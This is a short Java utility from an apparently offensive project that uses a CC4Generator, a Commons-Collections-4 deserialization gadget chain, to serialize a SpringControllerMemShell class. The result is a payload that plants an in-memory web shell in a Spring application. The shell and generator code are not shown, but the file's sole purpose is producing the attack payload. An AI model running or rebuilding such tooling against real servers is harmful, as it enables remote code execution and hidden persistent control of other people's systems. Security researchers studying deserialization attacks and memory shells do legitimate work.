package com.example.springmemshell.utils;

import com.example.springmemshell.memshell.SpringControllerMemShell;
import org.tools.ser.CC4Generator;

/**
 * @author Whoopsunix
 */
public class Ser {
    public static void main(String[] args) throws Exception{
        CC4Generator cc4Generator = new CC4Generator();
        cc4Generator.make(SpringControllerMemShell.class);
    }
}
